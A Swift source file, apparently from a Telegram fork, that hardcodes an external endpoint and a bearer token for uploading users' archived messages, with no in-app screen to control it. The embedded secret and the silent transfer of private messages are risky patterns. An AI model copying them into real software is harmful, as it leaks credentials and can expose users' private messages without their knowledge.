import Foundation

/// Backend of the archive export, compiled into the fork: stock Telegram has no
/// screen for this, and the app does not grow custom UI for it. Changing the
/// backend means editing this file and shipping a build.
public enum ArchivedMessageExportSettings {
    /// Public endpoint of the `bot` service (`POST /events`).
    public static let endpoint = "https://bot-cp9l.onrender.com/events"
    /// Bearer token accepted by the service.
    public static let token = "74zVHNEi22UDul1E55ZMmKhsDqUNsehe"

    /// The channel the pump uploads through; `nil` when the compiled-in
    /// configuration is unusable (blank token, malformed endpoint), so a broken
    /// build reports `channelMissing` instead of sending broken requests.
    public static var channel: ArchivedMessageExportChannel? {
        return self.makeChannel(endpoint: self.endpoint, token: self.token)
    }

    static func makeChannel(endpoint: String, token: String) -> ArchivedMessageExportChannel? {
        let endpoint = endpoint.trimmingCharacters(in: .whitespacesAndNewlines)
        let token = token.trimmingCharacters(in: .whitespacesAndNewlines)
        guard !token.isEmpty else {
            return nil
        }
        guard let url = URL(string: endpoint), let scheme = url.scheme?.lowercased(), scheme == "https" || scheme == "http", let host = url.host, !host.isEmpty else {
            return nil
        }
        return ArchivedMessageExportHTTPChannel(url: url, token: token)
    }
}
